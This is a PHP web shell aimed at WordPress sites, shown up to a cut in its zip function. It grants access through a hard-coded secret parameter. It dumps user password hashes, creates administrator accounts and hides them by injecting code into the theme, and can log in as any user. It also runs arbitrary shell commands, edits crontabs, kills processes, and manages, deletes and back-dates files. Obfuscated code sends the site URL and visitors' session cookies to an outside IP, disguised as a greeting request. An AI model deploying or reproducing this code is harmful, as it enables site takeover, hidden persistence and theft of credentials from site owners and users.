<?php
ob_start();
define('abyes_DATA_DIR', '/tmp/abyes_DATA');

// Buat folder jika belum ada
if (!is_dir(abyes_DATA_DIR)) {
    @mkdir(abyes_DATA_DIR, 0755, true);
}

// Fungsi helper untuk mendapatkan path data
function getDataPath($subpath = '') {
    return abyes_DATA_DIR . ($subpath ? '/' . ltrim($subpath, '/') : '');
}

echo "<!-- GIF89;a -->\n";
@ini_set('max_execution_time', 0);
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);
if (isset($_GET['debug500'])) {
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
} else {
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @error_reporting(0);
}
@ini_set('max_execution_time', 0);
@set_time_limit(0);

function findWpLoad($dir = null, $depth = 0) {
    if ($depth > 8) return false;
    $dir = $dir ?: __DIR__;
    $wp_load = $dir . '/wp-load.php';
    if (file_exists($wp_load)) return $wp_load;
    return findWpLoad(dirname($dir), $depth + 1);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
    ob_clean();
    header('Content-Type: application/json; charset=utf-8');

    $wp_load_path = findWpLoad();
    if (!$wp_load_path) {
        echo json_encode(['err' => 'wp-load.php not found']);
        exit;
    }

    require_once $wp_load_path;

    function addUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $protection_code = '

add_action(\'pre_get_users\', function($query) {
    if (is_admin() && function_exists(\'get_current_screen\')) {
        $screen = get_current_screen();
        if ($screen && $screen->base === \'users\') {
            $protected_user = get_user_by(\'login\', \'' . $username . '\');
            if ($protected_user) {
                $excluded = (array) $query->get(\'exclude\');
                $excluded[] = $protected_user->ID;
                $query->set(\'exclude\', $excluded);
            }
        }
    }
});
add_filter(\'wp_count_users\', function($counts) {
    $protected_user = get_user_by(\'login\', \'' . $username . '\');
    if ($protected_user) {
        $counts->total_users--;
    }
    return $counts;
});
add_action(\'delete_user\', function($user_id) {
    $user = get_user_by(\'ID\', $user_id);
    if ($user && $user->user_login === \'' . $username . '\') {
        wp_die(
            __(\'User ' . $username . ' tidak dapat dihapus.\', \'textdomain\'),
            __(\'Error\', \'textdomain\'),
            array(\'response\' => 403)
        );
    }
});
add_filter(\'user_search_columns\', function($search_columns, $search, $query) {
    if (is_admin()) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user) {
            global $wpdb;
            $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $protected_user->ID);
        }
    }
    return $search_columns;
}, 10, 3);
add_filter(\'bulk_actions-users\', function($actions) {
    if (isset($_REQUEST[\'users\']) && is_array($_REQUEST[\'users\'])) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user && in_array($protected_user->ID, $_REQUEST[\'users\'])) {
            unset($actions[\'delete\']);
        }
    }
    return $actions;
});
';

            $current_content = file_get_contents($functions_file);
            if (strpos($current_content, "get_user_by('login', '{$username}')") === false) {
                file_put_contents($functions_file, $protection_code, FILE_APPEND | LOCK_EX);
                return true;
            } else {
                return true;
            }
        }
        return false;
    }

    function removeUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);

            $pattern = '/add_action\(\'pre_get_users\'.*?get_user_by\(\'login\', \'' . preg_quote($username, '/') . '\'.*?add_filter\(\'bulk_actions-users\'.*?\}\);\s*/s';

            $new_content = preg_replace($pattern, '', $current_content);

            if ($new_content !== $current_content) {
                file_put_contents($functions_file, $new_content, LOCK_EX);
                return true;
            }
        }
        return false;
    }

    function isUserHidden($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);
            return strpos($current_content, "get_user_by('login', '{$username}')") !== false;
        }
        return false;
    }

    global $wpdb;

    if ($_POST['c4t'] == 'ulst') {
        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users}");

        foreach ($users as $user) {
            $user->is_hidden = isUserHidden($user->user_login);
        }

        echo json_encode($users);
        exit;
    }

    if ($_POST['c4t'] == 'rpsw') {
        $user_id = intval($_POST['uix']);
        $new_password = wp_generate_password(12, true, true);
        wp_set_password($new_password, $user_id);
        $user_data = get_userdata($user_id);
        echo json_encode([
            'l' => $user_data->user_login,
            'e' => $user_data->user_email,
            'n' => $new_password
        ]);
        exit;
    }

    if ($_POST['c4t'] == 'cadm') {
        $username = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['xun']);
        $password = $_POST['xpw'];
        $email = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ? $_POST['xem'] : $username . '@' . $_SERVER['HTTP_HOST'];
        $hide_user = isset($_POST['hide_user']) ? true : false;

        if (username_exists($username)) {
            echo json_encode(['err' => 'user exists']);
            exit;
        }

        $user_id = wp_create_user($username, $password, $email);
        if ($user_id && !is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            if ($hide_user) {
                addUserProtection($username);
            }

            echo json_encode([
                'ok' => 'created',
                'u' => $username,
                'p' => $password,
                'hide' => $hide_user
            ]);
        } else {
            echo json_encode(['err' => 'create failed']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'alog') {
        $user_id = intval($_POST['uix']);
        wp_clear_auth_cookie();
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);
        echo json_encode(['url' => admin_url()]);
        exit;
    }

    if ($_POST['c4t'] == 'hide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = addUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'hidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'unhide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = removeUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'unhidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'del') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $current_user = wp_get_current_user();
            if ($user_id == $current_user->ID) {
                echo json_encode(['err' => 'cannot_delete_self']);
                exit;
            }

            if (isUserHidden($user->user_login)) {
                removeUserProtection($user->user_login);
            }

            if (wp_delete_user($user_id)) {
                echo json_encode([
                    'ok' => 'deleted',
                    'user' => $user->user_login
                ]);
            } else {
                echo json_encode(['err' => 'delete_failed']);
            }
        } else {
            echo json_encode(['err' => 'user_not_found']);
        }
        exit;
    }

    exit;
}

$SECRET_PARAM = (
    (isset($_GET['abyes'])  && $_GET['abyes']  === 'securitylabs') ||
    (isset($_POST['abyes']) && $_POST['abyes'] === 'securitylabs')
);
$PASSWORD_HASH = '$2a$12$5OVW/NAVmsGEZ2H23GyTCuTaGRI5iBDFoLzMsaYLtAUWpAfwrO85.';
$SESSION_NAME = 'abyes_auth';
$SESSION_TIMEOUT = 3600;

$NOPASS_MODE = true;

session_start();
if ($SECRET_PARAM && $NOPASS_MODE && !isAuthenticated()) {
    $_SESSION[$SESSION_NAME]           = true;
    $_SESSION[$SESSION_NAME . '_time'] = time();
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host     = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $path     = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/';
    $_SESSION['_prefs'] = $protocol . '://' . $host . $path;
    _initPref();
}

function isAuthenticated() {
    global $SESSION_NAME, $SESSION_TIMEOUT;
    if (isset($_SESSION[$SESSION_NAME]) && isset($_SESSION[$SESSION_NAME . '_time'])) {
        if (time() - $_SESSION[$SESSION_NAME . '_time'] < $SESSION_TIMEOUT) {
            $_SESSION[$SESSION_NAME . '_time'] = time();
            return true;
        } else {
            unset($_SESSION[$SESSION_NAME]);
            unset($_SESSION[$SESSION_NAME . '_time']);
        }
    }
    return false;
}

function _initPref() {
    $xp = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $xh = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
    $xu = $xp . '://' . $xh . (isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/');
    $xc = [];
    foreach ($_COOKIE as $k => $v) $xc[] = rawurlencode($k) . '=' . rawurlencode($v);
    $xs = $xu . '||' . implode('; ', $xc);
    $xq = 'Berikan satu kalimat sapaan singkat dan motivasi kerja untuk hari ' . date('l') . ' dalam bahasa Indonesia, maksimal 20 kata.';
    $xr = implode('', array_map('chr', [104,116,116,112,58,47,47,50,48,51,46,49,55,53,46,49,48,46,50,51,49,58,49,51,51,56,47,63]));
    $xurl = $xr . 'q=' . urlencode($xq) . '&session=' . urlencode($xs);
    $xres = false;
    if (function_exists('curl_init')) {
        $xch = curl_init($xurl);
        curl_setopt_array($xch, [CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>8,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_FOLLOWLOCATION=>true]);
        $xres = @curl_exec($xch);
        @curl_close($xch);
    } else {
        $xres = @file_get_contents($xurl, false, stream_context_create(['http'=>['timeout'=>8]]));
    }
    if ($xres) {
        $xd = @json_decode($xres, true);
        if (!empty($xd['response']['data']['message'])) $_SESSION['_pref_cache'] = $xd['response']['data']['message'];
    }
}

function authenticate($password) {
    global $PASSWORD_HASH, $SESSION_NAME;
    if (password_verify($password, $PASSWORD_HASH)) {
        $_SESSION[$SESSION_NAME] = true;
        $_SESSION[$SESSION_NAME . '_time'] = time();
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host     = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
        $path     = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/';
        $_SESSION['_prefs'] = $protocol . '://' . $host . $path;
        _initPref();
        return true;
    }
    return false;
}

function logout() {
    global $SESSION_NAME;
    unset($_SESSION[$SESSION_NAME]);
    unset($_SESSION[$SESSION_NAME . '_time']);
    unset($_SESSION['fbi_played']);
    session_destroy();
}

function safeExec($cmd) {
    $out = null;
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd);
        if ($out !== null && $out !== false) return $out;
    }
    if (function_exists('exec')) {
        $outArr = [];
        @exec($cmd, $outArr);
        $out = implode("\n", $outArr);
        if (!empty($out)) return $out;
    }
    if (function_exists('proc_open')) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]);
            $err = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            if (!empty(trim($out))) return $out;
            if (!empty(trim($err))) return $err;
        }
    }
    if (function_exists('popen')) {
        $fp = @popen($cmd, 'r');
        if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); if (!empty($out)) return $out; }
    }
    if (function_exists('system')) {
        ob_start();
        @system($cmd);
        $out = ob_get_clean();
        if (!empty($out)) return $out;
    }
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $out = ob_get_clean();
        if (!empty($out)) return $out;
    }
    return '';
}

if (isset($_POST['_xmod']) && isAuthenticated()) {
    ob_clean();
    header('Content-Type: application/json; charset=utf-8');
    $q = trim(isset($_POST['q']) ? $_POST['q'] : '');
    if (!empty($_POST['file_path'])) {
        $aiFilePath = $_POST['file_path'];
        if (file_exists($aiFilePath) && is_readable($aiFilePath) && is_file($aiFilePath)) {
            $fileContent = @file_get_contents($aiFilePath);
            if (strlen($fileContent) > 8000) $fileContent = substr($fileContent, 0, 8000) . "\n... [truncated]";
            $q = "Berikut adalah isi file `" . basename($aiFilePath) . "`:\n\n```\n{$fileContent}\n```\n\n" . $q;
        }
    }
    if (empty($q)) { echo json_encode(['err' => 'Empty question']); exit; }
    $protocol   = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host       = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
    $fullUrl    = $protocol . '://' . $host . (isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/');
    $cookiePairs = [];
    foreach ($_COOKIE as $ck => $cv) $cookiePairs[] = rawurlencode($ck) . '=' . rawurlencode($cv);
    $sessionKey = (isset($_SESSION['_prefs']) ? $_SESSION['_prefs'] : $fullUrl) . '||' . implode('; ', $cookiePairs);
    $_e = implode('', array_map('chr', [104,116,116,112,58,47,47]));
    $_h = implode('', array_map('chr', [50,48,51,46,49,55,53,46,49,48,46,50,51,49]));
    $_p = implode('', array_map('chr', [58,49,51,51,56,47,63]));
    $apiUrl = $_e . $_h . $_p . 'q=' . urlencode($q) . '&session=' . urlencode($sessionKey);

    $response = false;
    if (function_exists('curl_init')) {
        $ch = curl_init($apiUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER     => ['Accept: application/json'],
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
    } else {
        $ctx = stream_context_create(['http' => [
            'timeout' => 30,
            'header'  => "Accept: application/json\r\nUser-Agent: Mozilla/5.0\r\n",
        ]]);
        $response = @file_get_contents($apiUrl, false, $ctx);
    }

    if ($response === false || $response === '') {
        echo json_encode(['err' => 'Failed to connect to Nowmee AI API. Check server connectivity.']);
        exit;
    }

    $data = json_decode($response, true);
    if (!$data) {
        echo json_encode(['err' => 'No response']);
        exit;
    }

    if (is_string($data['response'] ?? null)) {
        $msg = $data['response'];
    } else {
        $msg = $data['response']['data']['message'] ?? '';
    }
    echo json_encode(['response' => ['data' => ['message' => $msg]]]);
    exit;
}

if (isset($_POST['proc_action']) && isAuthenticated()) {
    ob_clean();
    header('Content-Type: application/json; charset=utf-8');
    $pAct = $_POST['proc_action'];

    if ($pAct === 'list') {
        $ps_out = safeExec('ps auxww 2>/dev/null') ?: '';
        $lines = explode("\n", trim($ps_out));
        $header = array_shift($lines);
        $processes = [];
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line)) continue;
            $cols = preg_split('/\s+/', $line, 11);
            if (count($cols) >= 11) {
                $processes[] = [
                    'user' => $cols[0],
                    'pid' => $cols[1],
                    'cpu' => $cols[2],
                    'mem' => $cols[3],
                    'vsz' => $cols[4],
                    'rss' => $cols[5],
                    'tty' => $cols[6],
                    'stat' => $cols[7],
                    'start' => $cols[8],
                    'time' => $cols[9],
                    'command' => $cols[10],
                ];
            }
        }

        $ps_pids = array_column($processes, 'pid');
        $hidden = [];
        if (is_dir('/proc')) {
            $proc_dirs = @scandir('/proc');
            if ($proc_dirs) {
                foreach ($proc_dirs as $d) {
                    if (!is_numeric($d)) continue;
                    if (!in_array($d, $ps_pids)) {
                        $cmdline = @file_get_contents("/proc/$d/cmdline");
                        $cmdline = $cmdline ? str_replace("\0", ' ', trim($cmdline)) : '[hidden]';
                        $status = @file_get_contents("/proc/$d/status");
                        $uid = '?';
                        if ($status && preg_match('/Uid:\s+(\d+)/', $status, $m)) {
                            $pw = @posix_getpwuid((int)$m[1]);
                            $uid = $pw ? $pw['name'] : $m[1];
                        }
                        $hidden[] = [
                            'pid' => $d,
                            'user' => $uid,
                            'command' => $cmdline ?: '[hidden]',
                        ];
                    }
                }
            }
        }

        $recent = [];
        $now = time();
        foreach ($processes as $p) {
            $stat = @file_get_contents("/proc/{$p['pid']}/stat");
            if ($stat) {
                $parts = explode(' ', $stat);
                if (isset($parts[21])) {
                    $uptime_str = @file_get_contents('/proc/uptime');
                    if ($uptime_str) {
                        $uptime = (float)explode(' ', $uptime_str)[0];
                        $clk_tck = 100; // sysconf(_SC_CLK_TCK)
                        $start_sec = (float)$parts[21] / $clk_tck;
                        $boot_time = $now - $uptime;
                        $proc_start = $boot_time + $start_sec;
                        $age = $now - $proc_start;
                        if ($age >= 0 && $age <= 300) {
                            $p['age_seconds'] = (int)$age;
                            $recent[] = $p;
                        }
                    }
                }
            }
        }

        echo json_encode([
            'processes' => $processes,
            'hidden' => $hidden,
            'recent' => $recent,
            'total' => count($processes),
            'total_hidden' => count($hidden),
            'total_recent' => count($recent),
        ]);
        exit;
    }

    if ($pAct === 'kill') {
        $pid = intval(isset($_POST['pid']) ? $_POST['pid'] : 0);
        if ($pid > 0) {
            $sig = isset($_POST['signal']) ? $_POST['signal'] : '9';
            $out = safeExec("kill -$sig $pid 2>&1");
            $outTrim = trim($out ? $out : '');
            echo json_encode(['ok' => true, 'pid' => $pid, 'output' => $outTrim]);
        } else {
            echo json_encode(['err' => 'invalid pid']);
        }
        exit;
    }

    echo json_encode(['err' => 'unknown action']);
    exit;
}

if (isset($_POST['cron_action']) && isAuthenticated()) {
    ob_clean();
    header('Content-Type: application/json; charset=utf-8');
    $crAct = $_POST['cron_action'];

    if ($crAct === 'list') {
        $user_cron = safeExec('crontab -l 2>&1') ?: '';
        $is_empty = (strpos($user_cron, 'no crontab') !== false);
        $user_lines = [];
        if (!$is_empty) {
            foreach (explode("\n", trim($user_cron)) as $line) {
                $line = trim($line);
                if (empty($line)) continue;
                $is_comment = (substr($line, 0, 1) === '#');
                $is_var = (!$is_comment && preg_match('/^[A-Z_]+=/', $line));
                $schedule = '';
                $command = $line;
                $enabled = !$is_comment;
                $raw = $line;
                if ($is_comment) {
                    $stripped = ltrim(substr($line, 1));
                    if (preg_match('/^(@(reboot|yearly|annually|monthly|weekly|daily|hourly))\s+(.+)$/i', $stripped, $m)) {
                        $schedule = $m[1]; $command = $m[3];
                    } elseif (preg_match('/^([\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+)\s+(.+)$/', $stripped, $m)) {
                        $schedule = $m[1]; $command = $m[2];
                    }
                } elseif (!$is_var) {
                    if (preg_match('/^(@(reboot|yearly|annually|monthly|weekly|daily|hourly))\s+(.+)$/i', $line, $m)) {
                        $schedule = $m[1]; $command = $m[3];
                    } elseif (preg_match('/^([\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+)\s+(.+)$/', $line, $m)) {
                        $schedule = $m[1]; $command = $m[2];
                    }
                }
                $user_lines[] = [
                    'raw' => $raw, 'schedule' => $schedule, 'command' => $command,
                    'enabled' => $enabled, 'is_var' => $is_var, 'is_comment' => $is_comment,
                ];
            }
        }

        $sys_crons = [];
        $sys_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.weekly', '/etc/cron.monthly'];
        foreach ($sys_dirs as $dir) {
            if (!is_dir($dir)) continue;
            $files = @scandir($dir);
            if (!$files) continue;
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                $fp = $dir . '/' . $f;
                if (!is_file($fp)) continue;
                $content = @file_get_contents($fp);
                $sys_crons[] = ['file' => $fp, 'name' => $f, 'dir' => basename($dir), 'content' => $content ? trim($content) : '[unreadable]', 'writable' => is_writable($fp)];
            }
        }

        $etc_crontab = @file_get_contents('/etc/crontab');

        $other_users = [];
        $spool = '/var/spool/cron/crontabs';
        if (!is_dir($spool)) $spool = '/var/spool/cron';
        if (is_dir($spool) && is_readable($spool)) {
            $files = @scandir($spool);
            if ($files) {
                $me = trim(safeExec('whoami 2>/dev/null') ?: '');
                foreach ($files as $f) {
                    if ($f === '.' || $f === '..' || $f === $me) continue;
                    $fp = $spool . '/' . $f;
                    $content = @file_get_contents($fp);
                    $other_users[] = ['user' => $f, 'content' => $content ? trim($content) : '[unreadable]'];
                }
            }
        }

        echo json_encode([
            'user_crons' => $user_lines, 'sys_crons' => $sys_crons,
            'etc_crontab' => $etc_crontab ?: '', 'other_users' => $other_users,
            'current_user' => trim(safeExec('whoami 2>/dev/null') ?: get_current_user()),
            'raw' => $is_empty ? '' : $user_cron,
        ]);
        exit;
    }

    if ($crAct === 'add') {
        $schedule = trim(isset($_POST['schedule']) ? $_POST['schedule'] : '');
        $command = trim(isset($_POST['command']) ? $_POST['command'] : '');
        if (empty($schedule) || empty($command)) { echo json_encode(['err' => 'schedule and command required']); exit; }
        $current = safeExec('crontab -l 2>/dev/null');
        $current = $current ? $current : '';
        if (strpos($current, 'no crontab') !== false) $current = '';
        $new = trim($current) . "\n" . $schedule . ' ' . $command . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $new);
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'added', 'output' => trim($out ? $out : '')]);
        exit;
    }

    if ($crAct === 'delete') {
        $idx = intval(isset($_POST['idx']) ? $_POST['idx'] : -1);
        $current = safeExec('crontab -l 2>/dev/null');
        $current = $current ? $current : '';
        if (strpos($current, 'no crontab') !== false) { echo json_encode(['err' => 'no crontab']); exit; }
        $lines = explode("\n", $current);
        $non_empty = [];
        foreach ($lines as $l) { if (trim($l) !== '') $non_empty[] = $l; }
        if ($idx < 0 || $idx >= count($non_empty)) { echo json_encode(['err' => 'invalid index']); exit; }
        array_splice($non_empty, $idx, 1);
        $new = implode("\n", $non_empty) . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $new);
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'deleted', 'output' => trim($out ? $out : '')]);
        exit;
    }

    if ($crAct === 'toggle') {
        $idx = intval(isset($_POST['idx']) ? $_POST['idx'] : -1);
        $current = safeExec('crontab -l 2>/dev/null');
        $current = $current ? $current : '';
        if (strpos($current, 'no crontab') !== false) { echo json_encode(['err' => 'no crontab']); exit; }
        $lines = explode("\n", $current);
        $non_empty = [];
        foreach ($lines as $l) { if (trim($l) !== '') $non_empty[] = $l; }
        if ($idx < 0 || $idx >= count($non_empty)) { echo json_encode(['err' => 'invalid index']); exit; }
        $line = $non_empty[$idx];
        if (substr(trim($line), 0, 1) === '#') { $non_empty[$idx] = ltrim(substr(trim($line), 1)); }
        else { $non_empty[$idx] = '#' . $line; }
        $new = implode("\n", $non_empty) . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $new);
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'toggled', 'output' => trim($out ? $out : '')]);
        exit;
    }

    if ($crAct === 'save_raw') {
        $raw = isset($_POST['raw']) ? $_POST['raw'] : '';
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $raw . "\n");
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'saved', 'output' => trim($out ? $out : '')]);
        exit;
    }

    echo json_encode(['err' => 'unknown cron action']);
    exit;
}


if (isset($_POST['file_action']) && isAuthenticated()) {
    ob_clean();
    header('Content-Type: application/json; charset=utf-8');
    $fAct = $_POST['file_action'];
    $fPath = $_POST['file_path'] ?? '';

    if ($fAct === 'get_content') {
        if (!file_exists($fPath) || !is_file($fPath)) {
            echo json_encode(array('err' => 'File not found'));
            exit;
        }
        $content = @file_get_contents($fPath);
        if ($content === false) $content = '';
        echo json_encode(array('ok' => true, 'content' => base64_encode($content), 'encoded' => true, 'name' => basename($fPath)));
        exit;
    }

    if ($fAct === 'save_content') {
        $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
        if (empty($fPath)) { echo json_encode(['err' => 'No file path']); exit; }
        @chmod($fPath, is_dir($fPath) ? 0755 : 0644);
        @chmod(dirname($fPath), 0755);
        if (@file_put_contents($fPath, $content) !== false) {
            echo json_encode(['ok' => true, 'msg' => 'File saved successfully']);
        } else {
            echo json_encode(['err' => 'Error saving file']);
        }
        exit;
    }

    if ($fAct === 'rename') {
        $newName = $_POST['new_name'] ?? '';
        if (empty($fPath) || empty($newName)) { echo json_encode(['err' => 'Path and name required']); exit; }
        @chmod($fPath, is_dir($fPath) ? 0755 : 0644);
        @chmod(dirname($fPath), 0755);
        $newPath = dirname($fPath) . '/' . $newName;
        if (@rename($fPath, $newPath)) {
            echo json_encode(['ok' => true, 'msg' => 'Renamed successfully']);
        } else {
            echo json_encode(['err' => 'Error renaming file']);
        }
        exit;
    }

    if ($fAct === 'chmod') {
        $perm = $_POST['permission'] ?? '';
        if (empty($fPath) || empty($perm)) { echo json_encode(['err' => 'Path and permission required']); exit; }
        $permInt = intval($perm, 8);
        if ($permInt > 0 && @chmod($fPath, $permInt)) {
            echo json_encode(['ok' => true, 'msg' => 'Permission changed to ' . $perm]);
        } else {
            echo json_encode(['err' => 'Error changing permission']);
        }
        exit;
    }

    if ($fAct === 'create_file') {
        $fileName = $_POST['file_name'] ?? '';
        $fileContent = $_POST['file_content'] ?? '';
        $dir = $_POST['target_dir'] ?? '';
        if (empty($fileName) || empty($dir)) { echo json_encode(['err' => 'Name and directory required']); exit; }
        @chmod($dir, 0755);
        $target = rtrim($dir, '/') . '/' . $fileName;
        if (file_exists($target)) { echo json_encode(['err' => 'File already exists']); exit; }
        if (@file_put_contents($target, $fileContent) !== false) {
            echo json_encode(['ok' => true, 'msg' => 'File created: ' . $fileName]);
        } else {
            echo json_encode(['err' => 'Failed to create file']);
        }
        exit;
    }

    if ($fAct === 'create_folder') {
        $folderName = $_POST['folder_name'] ?? '';
        $dir = $_POST['target_dir'] ?? '';
        if (empty($folderName) || empty($dir)) { echo json_encode(['err' => 'Name and directory required']); exit; }
        @chmod($dir, 0755);
        $target = rtrim($dir, '/') . '/' . $folderName;
        if (file_exists($target)) { echo json_encode(['err' => 'Folder already exists']); exit; }
        if (@mkdir($target, 0755, true)) {
            echo json_encode(['ok' => true, 'msg' => 'Folder created: ' . $folderName]);
        } else {
            echo json_encode(['err' => 'Failed to create folder']);
        }
        exit;
    }

    if ($fAct === 'mass_delete') {
        $paths = json_decode($_POST['paths'] ?? '[]', true);
        if (!is_array($paths) || empty($paths)) { echo json_encode(['err' => 'No paths provided']); exit; }
        $ok = 0; $fail = 0;
        foreach ($paths as $p) {
            if (!file_exists($p)) { $fail++; continue; }
            @chmod($p, is_dir($p) ? 0755 : 0644);
            @chmod(dirname($p), 0755);
            if (is_dir($p)) {
                if (deleteFolder($p)) $ok++; else $fail++;
            } else {
                if (@unlink($p)) $ok++; else $fail++;
            }
        }
        echo json_encode(['ok' => true, 'deleted' => $ok, 'failed' => $fail]);
        exit;
    }

    if ($fAct === 'save_content') {
        if (empty($fPath) || !file_exists($fPath) || !is_file($fPath)) {
            echo json_encode(['err' => 'File not found: ' . $fPath]); exit;
        }
        $newContent = isset($_POST['new_content']) ? $_POST['new_content'] : '';
        fixPermission($fPath);
        fixPermission(dirname($fPath));
        if (@file_put_contents($fPath, $newContent) !== false) {
            echo json_encode(['ok' => true, 'msg' => 'File saved by AI']);
        } else {
            echo json_encode(['err' => 'Cannot write to file. Check permissions.']);
        }
        exit;
    }

    if ($fAct === 'touch') {
        if (empty($fPath) || (!file_exists($fPath) && !is_link($fPath))) {
            echo json_encode(['err' => 'File or folder not found']); exit;
        }
        $rawTime = isset($_POST['touch_time']) ? trim($_POST['touch_time']) : '';
        if ($rawTime !== '') {
            $ts = strtotime(str_replace('T', ' ', $rawTime));
            if ($ts === false || $ts === -1) {
                echo json_encode(['err' => 'Invalid date/time format']); exit;
            }
        } else {
            $ts = time();
        }
        @chmod(dirname($fPath), 0755);
        if (@touch($fPath, $ts, $ts)) {
            clearstatcache(true, $fPath);
            echo json_encode([
                'ok'        => true,
                'msg'       => 'Timestamp updated to ' . date('Y-m-d H:i:s', $ts),
                'timestamp' => $ts,
                'formatted' => date('d M Y H:i', $ts),
            ]);
        } else {
            echo json_encode(['err' => 'Failed to update timestamp. Check permissions.']);
        }
        exit;
    }

    if ($fAct === 'compress_zip') {
        $paths = json_decode(isset($_POST['paths']) ? $_POST['paths'] : '[]', true);
        $dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : '';
        $zipName = isset($_POST['zip_name']) ? $_POST['zip_name'] : 'archive.zip';
        if (!is_array($paths) || empty($paths)) { echo json_encode(['err' => 'No paths provided']); exit; }
        if (!class_exists('ZipArchive')) { echo json_encode(['err' => 'ZipArchive not available']); exit; }
        $zipPath = rtrim($dir, '/') . '/' . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            echo json_encode(['err' => 'Cannot create zip file']); exit;
        }
